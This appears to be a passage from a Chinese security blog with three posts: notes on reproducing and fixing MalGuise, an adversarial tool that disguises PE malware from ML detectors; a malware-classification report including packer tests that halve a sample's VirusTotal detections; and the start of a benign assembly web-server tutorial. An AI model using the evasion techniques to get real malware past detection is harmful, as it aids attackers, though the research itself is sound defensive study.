</span><br></pre></td></tr></table></figure>

<h3 id="MalGuise-实验复现记录："><a href="#MalGuise-实验复现记录：" class="headerlink" title="MalGuise 实验复现记录："></a>MalGuise 实验复现记录：</h3><p>MalGuise实现了两个操作<code>slack_space</code>和’new_section’，也即将无语义操作<code>semnop</code>插入到PE文件的空闲位置，在第一个可执行段的末尾除插入跳转指令到无语义操作，执行完成后返回。并通过<code>mcts</code>求解。</p>
<p><strong>代码中存在的问题:</strong></p>
<ul>
<li>在计算<code>rva_to_be_injected</code>时没有<strong>越界检查</strong>，会导致覆盖有效内容段</li>
<li>无法使用作者给的办法部署<code>MalGuise troch serve</code></li>
<li>当前还一次还只能处理一个病毒样本</li>
<li>❗️注意：只支持输入32位PE文件</li>
</ul>
<p><strong>我对代码修改的部分</strong>：</p>
<ul>
<li>在<code>patch.py</code>中增加了段越界检查，并在<code>ClASS mcts_state</code>中增加<code>rva_to_be_injected_exceed_section</code>用于终端该结点往下的搜索。</li>
<li>新增<code>malgraph_handler.py</code>、<code>load_malgraph_model.py</code>和<code>test_deployed_server.py</code>用于部署<code>Malgraph Torch Serve</code>，详细的部署过程记录在 <code>README</code>中。</li>
</ul>
<p><strong>如何加入新的检测器</strong>:</p>
<p>在<code>classfier.py</code>的<code>Classifier</code>类中增加新的检测器的判断，在<code>models</code>文件夹下新建<code>ClamAV</code>文件夹并实现一个<code>ClamAV</code>的类。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/24/malware-classification/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.JPG">
      <meta itemprop="name" content="theLonging">
      <meta itemprop="description" content="不捨晝夜。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="talk is cheap, show me the code.">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/06/24/malware-classification/" class="post-title-link" itemprop="url">malware-classification</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-06-24 12:23:58" itemprop="dateCreated datePublished" datetime="2024-06-24T12:23:58+08:00">2024-06-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-06-27 14:34:42" itemprop="dateModified" datetime="2024-06-27T14:34:42+08:00">2024-06-27</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>8.7k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>8 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="恶意代码分类报告"><a href="#恶意代码分类报告" class="headerlink" title="恶意代码分类报告"></a>恶意代码分类报告</h1><h2 id="1-恶意代码行为分析"><a href="#1-恶意代码行为分析" class="headerlink" title="1. 恶意代码行为分析"></a>1. 恶意代码行为分析</h2><h3 id="1-1-下载器和启动器"><a href="#1-1-下载器和启动器" class="headerlink" title="1.1 下载器和启动器"></a>1.1 下载器和启动器</h3><p>下载器通常会与**漏洞利用<code>exploit</code>**打包在一起。下载器通常使用<code>Windows API</code>函数<code>URLDownloadtoFileA</code>和<code>WinExec</code>，来下载并运行新的恶意代码。</p>
<h3 id="1-2-后门"><a href="#1-2-后门" class="headerlink" title="1.2 后门"></a>1.2 后门</h3><p>后门能让攻击者远程访问一个受害的机器。</p>
<p>一个常用的方法是利用80端口使用HTTP协议。</p>
<p>查看后门使用和导入的<code>Windows</code>函数，可以确定后门实现的功能。</p>
<h3 id="1-3-反向shell"><a href="#1-3-反向shell" class="headerlink" title="1.3 反向shell"></a>1.3 反向shell</h3><p>反向shell是从被感染机器上发起一个链接，它提供攻击者shell访问被感染机器的权限。</p>
<h3 id="1-4-远程控制工具"><a href="#1-4-远程控制工具" class="headerlink" title="1.4 远程控制工具"></a>1.4 远程控制工具</h3><p>远程控制工具RAT被用来远程管理一台或多台计算机。</p>
<h3 id="1-5-僵尸网络"><a href="#1-5-僵尸网络" class="headerlink" title="1.5 僵尸网络"></a>1.5 僵尸网络</h3><h3 id="1-6-登陆凭证窃密器"><a href="#1-6-登陆凭证窃密器" class="headerlink" title="1.6 登陆凭证窃密器"></a>1.6 登陆凭证窃密器</h3><h3 id="1-7-存活机制"><a href="#1-7-存活机制" class="headerlink" title="1.7 存活机制"></a>1.7 存活机制</h3><h3 id="1-8-提权"><a href="#1-8-提权" class="headerlink" title="1.8 提权"></a>1.8 提权</h3><h3 id="1-9-隐密-用户态rootkit"><a href="#1-9-隐密-用户态rootkit" class="headerlink" title="1.9 隐密-用户态rootkit"></a>1.9 隐密-用户态rootkit</h3><h2 id="2-Virustotal检测病毒的方法"><a href="#2-Virustotal检测病毒的方法" class="headerlink" title="2. Virustotal检测病毒的方法"></a>2. Virustotal检测病毒的方法</h2><p>通过<code>Crowdsourced Sigma Rules</code>和<code>Crowdsourced IDS rules</code>猜测使用的是</p>
<ul>
<li><code>https://github.com/SigmaHQ/sigma</code> 这个是出现次数最到的</li>
<li><code>https://github.com/travisbgreen/hunting-rules</code></li>
<li><code>https://github.com/aws-samples/aws-network-firewall-rulegroups-with-proofpoints-emerging-threats-open-ruleset</code></li>
<li><code>https://snort.org/documents/registered-vs-subscriber</code></li>
<li><code>https://github.com/kevoreilly/CAPEv2</code></li>
</ul>
<h3 id="2-1-sigma是一种动态分析方法"><a href="#2-1-sigma是一种动态分析方法" class="headerlink" title="2.1 sigma是一种动态分析方法"></a>2.1 sigma是一种动态分析方法</h3><p>仓库 <code>https://github.com/SigmaHQ/sigma</code></p>
<p>sigma通过查询windows日志文件<code>log file</code>的方法检测病毒。</p>
<p>这意味着sigma必须要在代码运行后才能通过日志检测病毒行为。</p>
<h3 id="2-2-yara"><a href="#2-2-yara" class="headerlink" title="2.2 yara"></a>2.2 yara</h3><p><strong>YARA是一款旨在帮助恶意软件研究人员识别和分类恶意软件样本的开源工具（由virustotal 的软件工程师Victor M. Alvarezk开发），使用YARA可以基于文本或二进制模式创建恶意软件家族描述信息，当然也可以是其他匹配信息。</strong></p>
<p><img src="/../images/malware-classification/%E6%88%AA%E5%B1%8F2024-06-24%2015.46.53-9292834.png" alt="截屏2024-06-24 15.46.53"></p>
<h3 id="2-3-ClamAV-是一种基于特征码扫描的杀毒软件"><a href="#2-3-ClamAV-是一种基于特征码扫描的杀毒软件" class="headerlink" title="2.3 ClamAV 是一种基于特征码扫描的杀毒软件"></a>2.3 ClamAV 是一种基于特征码扫描的杀毒软件</h3><h3 id="2-4-CAPEv2-是一种sandbox"><a href="#2-4-CAPEv2-是一种sandbox" class="headerlink" title="2.4 CAPEv2 是一种sandbox"></a>2.4 CAPEv2 是一种sandbox</h3><p>功能：</p>
<ul>
<li>基于 API 钩子的行为监测</li>
<li>捕获执行期间创建、修改和删除的文件</li>
<li>以 PCAP 格式捕获网络流量</li>
<li>基于行为和网络签名的恶意软件分类</li>
<li>在恶意软件执行期间捕获桌面截图</li>
<li>目标系统的完整内存转储</li>
<li>自动动态恶意软件解包</li>
<li>基于对解包负载的 YARA 签名的恶意软件分类</li>
<li>静态和动态恶意软件配置提取</li>
<li>可通过 YARA 签名编程的自动化调试器，允许：</li>
</ul>
<h3 id="2-5-signature-base"><a href="#2-5-signature-base" class="headerlink" title="2.5 signature-base"></a>2.5 signature-base</h3><ul>
<li>Arnim Rupp (<a target="_blank" rel="noopener" href="https://github.com/ruppde">https://github.com/ruppde</a>)</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Neo23x0/signature-base">https://github.com/Neo23x0/signature-base</a></li>
</ul>
<h2 id="3-Virustotal-Threat-Label"><a href="#3-Virustotal-Threat-Label" class="headerlink" title="3. Virustotal Threat Label"></a>3. Virustotal Threat Label</h2><ul>
<li><p>Trojan：</p>
<p><strong>定义</strong>：特洛伊木马是一种恶意软件，它伪装成合法的软件或隐藏在合法软件中。用户在不知情的情况下执行这些看似无害的程序，从而激活了木马的恶意功能。</p>
<p><strong>功能</strong>：木马可以执行多种恶意活动，如远程控制、窃取数据、安装其他恶意软件、监视用户行为等。</p>
<p><strong>隐蔽性</strong>：木马不具备自我复制的能力，它们依赖于用户的误操作或诱导，这使得它们在不被察觉的情况下运行。</p>
</li>
<li><p>Dropper:</p>
<p><strong>定义</strong>：投放器是一种设计用来“投放”或安装其他恶意软件到受害者系统的恶意程序。投放器本身可能不执行任何明显的恶意活动，但它会创建一个环境或路径，使其他恶意程序可以被安装和执行。</p>
<p><strong>功能</strong>：投放器通常包含一个或多个其他恶意软件的负载，它在执行时会悄无声息地释放这些负载到宿主机上。</p>
<p><strong>使用目的</strong>：投放器的主要目的是作为多阶段攻击的一部分，先安静地进入系统，然后部署更具破坏性或窃取性的恶意软件。</p>
</li>
<li><p>Virus：病毒是自我复制的恶意软件，它传播的方式是通过插入自己的代码到其他程序或文件中。</p>
</li>
<li><h3 id="Spyware（间谍软件）"><a href="#Spyware（间谍软件）" class="headerlink" title="Spyware（间谍软件）"></a>Spyware（间谍软件）</h3><p><strong>定义</strong>：间谍软件是设计用来从用户的计算机上秘密收集用户的信息的软件。它通常在不告知用户的情况下运行，收集诸如键盘输入、浏览习惯、登录凭证等敏感信息。</p>
<p><strong>功能</strong>：间谍软件可能用于广告目的（显示定制广告），也可能用于更恶意的目的，如身份盗窃或金融诈骗。</p>
</li>
</ul>
<h2 id="4-针对不同packer的检测"><a href="#4-针对不同packer的检测" class="headerlink" title="4. 针对不同packer的检测"></a>4. 针对不同packer的检测</h2><h3 id="4-1-upx"><a href="#4-1-upx" class="headerlink" title="4.1 upx"></a>4.1 upx</h3><p>hello_uninfected.exe 打包前 3&#x2F;72；打包后 9&#x2F;73；CrowdStrike Falcon； Cynet；Microsoft；SecureAge；Symantec；Trapmine；Webroot。</p>
<p>hello_infected.exe 打包前 11&#x2F;74；打包后 17&#x2F;74</p>
<p>VirusShare_0ac9b76b75dc91d42e0ca83a4890cbe0</p>
<table>
<thead>
<tr>
<th>文件名</th>
<th>打包前</th>
<th>打包后</th>
<th>病毒分类</th>
</tr>
</thead>
<tbody><tr>
<td>hello_uninfected.exe</td>
<td>3&#x2F;72</td>
<td>9&#x2F;73</td>
<td></td>
</tr>
<tr>
<td>hello_infected.exe</td>
<td>11&#x2F;73</td>
<td>17&#x2F;74</td>
<td></td>
</tr>
<tr>
<td>VirusShare_0ac9b76b75dc91d42e0ca83a4890cbe0</td>
<td>52&#x2F;74</td>
<td>26&#x2F;73</td>
<td></td>
</tr>
</tbody></table>
<h3 id="4-2-PELock"><a href="#4-2-PELock" class="headerlink" title="4.2 PELock"></a>4.2 PELock</h3><h3 id="4-3-PECompact"><a href="#4-3-PECompact" class="headerlink" title="4.3 PECompact"></a>4.3 PECompact</h3><h3 id="4-4-Obsidium"><a href="#4-4-Obsidium" class="headerlink" title="4.4 Obsidium"></a>4.4 Obsidium</h3><h3 id="4-5-Petite"><a href="#4-5-Petite" class="headerlink" title="4.5 Petite"></a>4.5 Petite</h3><h3 id="4-6-tElock"><a href="#4-6-tElock" class="headerlink" title="4.6 tElock"></a>4.6 tElock</h3><h3 id="4-7-Themida"><a href="#4-7-Themida" class="headerlink" title="4.7 Themida"></a>4.7 Themida</h3><h3 id="4-8-MPRESS"><a href="#4-8-MPRESS" class="headerlink" title="4.8 MPRESS"></a>4.8 MPRESS</h3><h3 id="4-9-kkrunchy"><a href="#4-9-kkrunchy" class="headerlink" title="4.9 kkrunchy"></a>4.9 kkrunchy</h3><h2 id="5-Malware-classification-and-composition-analysis-A-survey-of-recent-developments"><a href="#5-Malware-classification-and-composition-analysis-A-survey-of-recent-developments" class="headerlink" title="5 Malware classification and composition analysis: A survey of recent developments"></a>5 Malware classification and composition analysis: A survey of recent developments</h2><p>我们的分析识别出需要解决的三个主要问题。</p>
<ul>
<li>第一个是需要克服现代逃避技术（或反分析技术）如变形技术。</li>
<li>第二个问题涉及到恶意软件搜索引擎的效率和可扩展性，因为仓库中的功能数量可能需要扩展到数百万。</li>
<li>第三个问题涉及到恶意软件分类系统对不断进化的对抗性示例的脆弱性。</li>
</ul>
<p>本调查的主要贡献包括：</p>
<ul>
<li>提出一种新的分类法，用于描述和比较恶意软件分类和组成分析的最新和主要发现。</li>
<li>设计了一个新框架，用于分析现有的恶意软件分类和组成分析技术。</li>
<li>确定并展示与恶意软件分析相关的开放性问题和挑战。</li>
<li>确定了该主题的一些趋势，并提供了指导方针，说明如何改进现有解决方案以应对新的和持续的挑战。</li>
</ul>
<p>我们还发现了需要进一步研究和调查的可能主题，如可持续的恶意软件分析系统。在这方面，我们提出了一些准备高效和可信的恶意软件检测和分析系统的指导方针。</p>
<h3 id="5-1-通过签名的方法探测和分类恶意软件"><a href="#5-1-通过签名的方法探测和分类恶意软件" class="headerlink" title="5.1 通过签名的方法探测和分类恶意软件"></a>5.1 通过签名的方法探测和分类恶意软件</h3><ul>
<li>[12]  Schultz MG, Eskin E, Zadok F, Stolfo SJ. Data mining methods for detection of new malicious executables. In: Security and privacy, 2001. S&amp;P 2001. Proceedings. 2001 IEEE symposium on. IEEE; 2001, p. 38–49.</li>
<li>[13]  Christodorescu M, Jha S. Static analysis of executables to detect malicious patterns. Technical report, Wisconsin Univ-Madison Dept of Computer Sciences; 2006.</li>
</ul>
<h3 id="5-2-自动签名生成方法"><a href="#5-2-自动签名生成方法" class="headerlink" title="5.2 自动签名生成方法"></a>5.2 自动签名生成方法</h3><ul>
<li>[14]  Chen J, Alalfi MH, Dean TR, Zou Y. Detecting android malware using clone detection. J Comput Sci Tech 2015;30(5):942–56.</li>
<li>[15]  Cesare S, Xiang Y. Classification of malware using structured control flow. In: Proceedings of the eighth Australasian symposium on parallel and distributed computing-volume 107. Australian Computer Society, Inc.; 2010, p. 61–70.</li>
<li>[16]  Ye Y, Li T, Huang K, Jiang Q, Chen Y. Hierarchical associative classifier (HAC) for malware detection from the large and imbalanced gray list. J Intell Inf Syst 2010;35(1):1–20.</li>
</ul>
<h3 id="5-3-机器学习模型检测和分类恶意软件"><a href="#5-3-机器学习模型检测和分类恶意软件" class="headerlink" title="5.3 机器学习模型检测和分类恶意软件"></a>5.3 机器学习模型检测和分类恶意软件</h3><blockquote>
<p>当恶意软件防御者提出使用某些特征和机器学习模型的新恶意软件分析系统时，恶意软件创建者通常会更新他们的恶意软件设计以避免被检测。然后，恶意软件防御者会提出新系统来检测和分析新一代的恶意软件，如此反复。恶意软件防御者和攻击者之间的这种竞赛可能永远不会结束。</p>
</blockquote>
<ul>
<li>[12] Schultz MG, Eskin E, Zadok F, Stolfo SJ. Data mining methods for detection of new malicious executables. In: Security and privacy, 2001. S&amp;P 2001.</li>
<li>[17]  Kolter JZ, Maloof MA. Learning to detect malicious executables in the wild. In: Proceedings of the Tenth ACM SIGKDD International Conference on Knowledge Discovery and Data Mining. ACM; 2004, p. 470–8.</li>
<li>[18]  Moskovitch R, Feher C, Tzachar N, Berger E, Gitelman M, Dolev S, Elovici Y. Unknown malcode detection using opcode representation. In: Intelligence and security informatics. Springer; 2008, p. 204–15.</li>
<li>[19]  Dai J, Guha RK, Lee J. Efficient virus detection using dynamic instruction sequences. J Comput Phys 2009;4(5):405–14.</li>
<li>[20]  Nataraj L, Karthikeyan S, Jacob G, Manjunath B. Malware images: visualization and automatic classification. In: Proceedings of the 8th international symposium on visualization for cyber security. ACM; 2011, p. 4.</li>
<li>[21]  Anderson B, Quist D, Neil J, Storlie C, Lane T. Graph-based malware detection using dynamic analysis. J Comput Virol 2011;7(4):247–58.</li>
<li>[22]  Islam R, Tian R, Batten LM, Versteeg S. Classification of malware based on integrated static and dynamic features. J Netw Comput Appl 2013;36(2):646–56.</li>
<li>[23]  Santos I, Devesa J, Brezo F, Nieves J, Bringas PG. Opem: A static-dynamic approach for machine-learning-based malware detection. In: International joint conference CISIS’12-ICEUTE 12-SOCO 12 special sessions. Springer; 2013, p. 271–80.</li>
<li>[24]  Dahl GE, Stokes JW, Deng L, Yu D. Large-scale malware classification using random projections and neural networks. In: Acoustics, speech and signal processing, 2013 IEEE international conference on. IEEE; 2013, p. 3422–6.</li>
<li>[25]  Saxe J, Berlin K. Deep neural network based malware detection using two dimensional binary program features. In: Malicious and unwanted software, 2015 10th international conference on. IEEE; 2015, p. 11–20.</li>
<li>[26]  Huang W, Stokes JW. MtNet: a multi-task neural network for dynamic mal- ware classification. In: International conference on detection of intrusions and malware, and vulnerability assessment. Springer; 2016, p. 399–418.</li>
<li>[27]  Kolosnjaji B, Zarras A, Webster G, Eckert C. Deep learning for classification of malware system call sequences. In: Australasian joint conference on artificial intelligence. Springer; 2016, p. 137–49.</li>
</ul>
<h3 id="5-4-使用深度学习模型检测和分类恶意代码"><a href="#5-4-使用深度学习模型检测和分类恶意代码" class="headerlink" title="5.4 使用深度学习模型检测和分类恶意代码"></a>5.4 使用深度学习模型检测和分类恶意代码</h3><blockquote>
<p>然通过使用最先进的深度学习架构提取强大且有用的特征已经取得了有希望的结果，但所提出的模型被证明对对抗性示例高度敏感，这些对抗性示例可以很容易地（仅通过延续输入的部分）被攻击者设计，以欺骗人工智能（AI）驱动的恶意软件分析系统，并使其产生错误的决策[24-29]。</p>
</blockquote>
<ul>
<li>[24]  Dahl GE, Stokes JW, Deng L, Yu D. Large-scale malware classification using random projections and neural networks. In: Acoustics, speech and signal processing, 2013 IEEE international conference on. IEEE; 2013, p. 3422–6.</li>
<li>[25]  Saxe J, Berlin K. Deep neural network based malware detection using two dimensional binary program features. In: Malicious and unwanted software, 2015 10th international conference on. IEEE; 2015, p. 11–20.</li>
<li>[26]  Huang W, Stokes JW. MtNet: a multi-task neural network for dynamic mal- ware classification. In: International conference on detection of intrusions and malware, and vulnerability assessment. Springer; 2016, p. 399–418.</li>
<li>[27]  Kolosnjaji B, Zarras A, Webster G, Eckert C. Deep learning for classification of malware system call sequences. In: Australasian joint conference on artificial intelligence. Springer; 2016, p. 137–49.</li>
</ul>
<p><strong>防御对抗性示例的方法</strong></p>
<ul>
<li>[28] Grosse K, Papernot N, Manoharan P, Backes M, McDaniel P. Adversarial examples for malware detection. In: European symposium on research in computer security. Springer; 2017, p. 62–79.</li>
<li>[29] Wang Q, Guo W, Zhang K, Ororbia II AG, Xing X, Liu X, Giles CL. Adversary resistant deep neural networks with an application to malware detection. In: Proceedings of the 23rd ACM SIGKDD international conference on knowledge discovery and data mining. ACM; 2017, p. 1145–53.</li>
</ul>
<h3 id="5-5-恶意软件分类的分类法"><a href="#5-5-恶意软件分类的分类法" class="headerlink" title="5.5 恶意软件分类的分类法"></a>5.5 恶意软件分类的分类法</h3><p><img src="/../images/malware-classification/%E6%88%AA%E5%B1%8F2024-06-27%2013.20.10.png" alt="截屏2024-06-27 13.20.10"></p>
<h4 id="5-5-1-特征提取方法"><a href="#5-5-1-特征提取方法" class="headerlink" title="5.5.1 特征提取方法"></a>5.5.1 特征提取方法</h4><p><strong>静态方法</strong></p>
<ul>
<li>使用文件格式提取</li>
<li>不了解格式的情况下提取字节序列、文件大小、字节熵等</li>
</ul>
<p><strong>优点：</strong>覆盖了完整的二进制内容</p>
<p><strong>缺点：</strong>容易受打包和多态性影响</p>
<p><strong>动态方法</strong></p>
<ul>
<li>从可执行文件的内存映像或其行为中提取特征</li>
</ul>
<p>检测可执行文件是否在虚拟机内执行的方法：</p>
<ul>
<li>Force UA. Analysis of the Intel Pentium’s ability to support a secure virtual machine monitor. In: Proceedings of the 9th USENIX security symposium. 2000. p. 129.</li>
<li>Rutkowska J. Redpill: Detect VMM using (almost) one CPU instruction. 2004, <a target="_blank" rel="noopener" href="http://invisiblethings.org/papers/redpill.html">http://invisiblethings.org/papers/redpill.html</a>.</li>
</ul>
<p><strong>混合方法</strong></p>
<p>将静态特征提取的特性与动态特征提取的特性结合起来，以实现更高的检测率</p>
<h4 id="5-5-2-特征种类"><a href="#5-5-2-特征种类" class="headerlink" title="5.5.2 特征种类"></a>5.5.2 特征种类</h4><p><strong>可打印字符串</strong>：从根本上说，大多数恶意软件的功能并不依赖于可打印字符串。因此，当恶意软件创建者发现某些字符串偶然被恶意软件检测器使用时，他们可以消除这些字符串，或者即使可打印字符串是必需的，他们也可以将其分解成分布在不同位置的字符。因此，可打印字符串不是可靠的特征。</p>
<p><strong>字节序列</strong></p>
<p>在大多数情况下，字节序列不可靠。这是因为混淆技术，如指令替换和寄存器重新分配，可以分别改变操作码和操作数，这意味着机器代码发生了变化。在所有这些工作中，字节码是静态提取的，但通过打包和多态性使用不同的算法或密钥加密的主程序体会改变字节序列。</p>
<blockquote>
<p>Anderson 等人[41]没有直接使用字节序列作为特征，而是将字节序列拟合到马尔可夫模型中，因此他们使用的特征实质上是从一个字节到另一个字节的转移概率。</p>
<p>Chen 等人[25] 使用每1024字节窗口的字节熵和每个字节的出现次数形成直方图，并将每个轴均匀分成16个区间，形成256长度的特征向量。</p>
<p>Nataraj 等人[20] 将文件的整个字节序列转换为图片，其中每个字节代表一个像素的灰度。他们发现，属于同一家族的恶意软件在布局和图像上看起来非常相似。用于将一维字节序列转换为二维矩阵的图像宽度由文件大小确定。恶意软件图像的图像特征是使用 Oliva 和 Torralbat [87] 提出的算法计算的。基于图像的技术的主要优点是它们对许多类型的混淆具有鲁棒性[88]。</p>
</blockquote>
<p><strong>汇编代码</strong></p>
<p><strong>API&#x2F;DLL系统调用</strong></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/24/pwn-Intro2Cybersecurity/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.JPG">
      <meta itemprop="name" content="theLonging">
      <meta itemprop="description" content="不捨晝夜。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="talk is cheap, show me the code.">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/06/24/pwn-Intro2Cybersecurity/" class="post-title-link" itemprop="url">pwn-Intro2Cybersecurity</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-06-24 12:23:01" itemprop="dateCreated datePublished" datetime="2024-06-24T12:23:01+08:00">2024-06-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-09-05 19:23:51" itemprop="dateModified" datetime="2024-09-05T19:23:51+08:00">2024-09-05</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>53k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>48 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Intro-to-Cybersecurity"><a href="#Intro-to-Cybersecurity" class="headerlink" title="Intro to Cybersecurity"></a>Intro to Cybersecurity</h1><h2 id="1-Building-a-Web-Server"><a href="#1-Building-a-Web-Server" class="headerlink" title="1. Building a Web Server"></a>1. Building a Web Server</h2><p><img src="/../images/pwn-Intro2Cybersecurity/%E6%88%AA%E5%B1%8F2024-06-26%2011.52.31.png" alt="截屏2024-06-26 11.52.31"></p>
<h3 id="1-1-Program-that-exits"><a href="#1-1-Program-that-exits" class="headerlink" title="1.1 Program that exits"></a>1.1 Program that exits</h3><p>使用汇编代码与环境交互</p>
<p><code>server.s</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix # .intel_syntax 指定汇编器使用Intel语法而不是AT&amp;T语法，noprefix 表明寄存器名称前不需要%前缀</span><br><span class="line">.globl _start 				 # 声明标签(函数) _start 为全局，_start 是执行开始的地方</span><br><span class="line"></span><br><span class="line">.section .text				 # 指示汇编器开始一个新的代码段（文本段）、这是存放程序指令的地方</span><br><span class="line"></span><br><span class="line">_start: 							 # 程序的入口标签	</span><br><span class="line">    mov rdi, 0				 # rdi 存储传递的第一个参数，这里作为exit系统调用的状态码</span><br><span class="line">    mov rax, 60     	 # SYS_exit 	rax寄存器用于指定系统调用的编号，60对应exit系统调用</span><br><span class="line">    syscall						 # 执行系统调用</span><br><span class="line"></span><br><span class="line">.section .data				 # 新的数据段</span><br></pre></td></tr></table></figure>

<h3 id="1-2-Program-that-creates-a-socket"><a href="#1-2-Program-that-creates-a-socket" class="headerlink" title="1.2 Program that creates a socket"></a>1.2 Program that creates a socket</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET     函数传入的第一个参数</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM 		传入的第二个参数</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP     传入的第三个参数</span><br><span class="line">    syscall # 系统调用</span><br><span class="line"></span><br><span class="line">    # 退出系统调用</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, 2             # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"> </span><br><span class="line">.section .data</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-3-Program-that-binds-a-socket"><a href="#1-3-Program-that-binds-a-socket" class="headerlink" title="1.3 Program that binds a socket"></a>1.3 Program that binds a socket</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 